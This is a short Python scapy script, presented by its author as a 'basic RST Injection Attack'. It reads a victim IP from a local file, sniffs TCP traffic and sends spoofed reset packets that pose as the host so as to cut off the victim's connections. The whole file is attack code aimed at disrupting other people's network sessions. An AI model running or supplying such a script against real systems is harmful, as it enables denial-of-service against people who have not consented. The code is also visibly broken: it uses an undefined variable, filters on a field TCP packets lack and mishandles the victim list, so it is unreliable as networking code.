import sys
from scapy.all import *

with open("/Users/spencer/Desktop/TCPRST/LightCloudPublicIP", "r") as text_file:
    data = text_file.readlines()
text_file.close()
print('Victim IP from .txt File: ' + data[1])

_iface = "en0"
victim_ip = data
win=512

def packet(t):
    if t[TCP].flags == 2:
        max_seq = t[TCP].ack + tcp_rst_count * win
        seqs = range(t[TCP].ack, max_seq, int(win / 2))

        # Send spoofed rst packet, acting like you are the host
        rst = IP(dst=t[IP].dst, src=t[IP].src)/TCP(dport=t[TCP].dport, sport=t[TCP].sport, window=win, seq=seqs[0], flags='R')
        send(rst)

print("Welcome to my basic RST Injection Attack, at anytime use the Cmd+C interrupt to close\n")
t_ = sniff(iface=_iface, lfilter = lambda s: s.haslayer(TCP) and s[TCP].src in victim_ip, prn=packet)

print('tcp reset attack finish')
